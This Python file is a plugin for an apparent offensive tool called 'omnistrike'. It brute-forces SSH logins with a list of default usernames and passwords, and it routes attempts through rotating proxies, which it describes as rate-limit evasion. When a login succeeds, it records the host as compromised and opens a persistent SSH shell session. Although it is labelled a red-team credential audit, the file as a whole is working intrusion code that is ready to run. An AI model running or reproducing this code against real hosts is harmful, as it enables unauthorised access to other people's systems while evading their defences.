import asyncio
import asyncssh
import random
from omnistrike.plugins.base import BasePlugin
from python_socks.async_.asyncio import Proxy

class CredentialAuditPlugin(BasePlugin):
    def __init__(self):
        # Professional red team credential list
        self.credentials = [
            ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
            ("root", "root"), ("root", "password"), ("root", "123456"), ("root", "toor"),
            ("user", "user"), ("user", "password"),
            ("pi", "raspberry"), ("ubuntu", "ubuntu"), ("guest", "guest"),
            ("support", "support"), ("sysadmin", "sysadmin")
        ]
        self.max_attempts_per_proxy = 3
        self.proxy_manager = None

    @property
    def name(self):
        return "CredentialAudit"

    @property
    def description(self):
        return "High-performance credential auditing with REAL proxy rotation and rate-limit evasion."

    async def check_ssh(self, ip, username, password):
        proxy_url = self.proxy_manager.get_random_proxy() if self.proxy_manager else None

        try:
            if proxy_url:
                proxy = Proxy.from_url(proxy_url)
                # Create a socket through the proxy
                sock = await proxy.connect(dest_host=ip, dest_port=22, timeout=5.0)
                # Pass the socket to asyncssh
                async with asyncssh.connect(sock=sock, username=username, password=password, known_hosts=None) as conn:
                    return True
            else:
                async with asyncssh.connect(ip, username=username, password=password, known_hosts=None) as conn:
                    return True
        except Exception as e:
            # print(f"DEBUG: {e}")
            return False

    async def run(self, target, data):
        open_ports = data.get('open_ports', {})
        audit_results = {}
        compromised_hosts = data.get('compromised_hosts', {})

        creds_to_test = data.get('audit_wordlist', self.credentials)

        for ip, ports in open_ports.items():
            if 22 in ports or "22" in ports:
                print(f"[*] Starting REAL-ROTATION credential audit on {ip}:22...")
                found_creds = []

                random.shuffle(creds_to_test)

                attempts_this_proxy = 0

                for username, password in creds_to_test:
                    if attempts_this_proxy >= self.max_attempts_per_proxy:
                        attempts_this_proxy = 0
                        # The check_ssh function will automatically pick a random proxy from the manager
                        # but we can log that we are effectively rotating.
                        if self.proxy_manager and self.proxy_manager.proxies:
                            print(f"[*] [ROTATION] Attempting from new proxy source...")

                    success = await self.check_ssh(ip, username, password)
                    attempts_this_proxy += 1

                    if success:
                        print(f"[!!!] SUCCESS: Found valid credentials for {ip}: {username}:{password}")
                        cred_entry = {"username": username, "password": password, "service": "ssh"}
                        found_creds.append(cred_entry)

                        if ip not in compromised_hosts:
                            compromised_hosts[ip] = []
                        compromised_hosts[ip].append(cred_entry)

                        # Create persistent session
                        try:
                            conn = await asyncssh.connect(ip, username=username, password=password, known_hosts=None)
                            self.session_manager.create_session(ip, conn, info={"user": username, "type": "SSH Shell"})
                            print(f"[*] Session established for {ip}")
                        except:
                            pass

                        # Stop after finding one valid credential for this host
                        break

                    await asyncio.sleep(0.1)

                if found_creds:
                    audit_results[ip] = found_creds

        data['credentials_found'] = audit_results
        data['compromised_hosts'] = compromised_hosts

        if audit_results:
            print(f"[*] Credential audit complete. Accessed {len(audit_results)} host(s)!")
        else:
            print(f"[*] Credential audit complete. No access gained.")
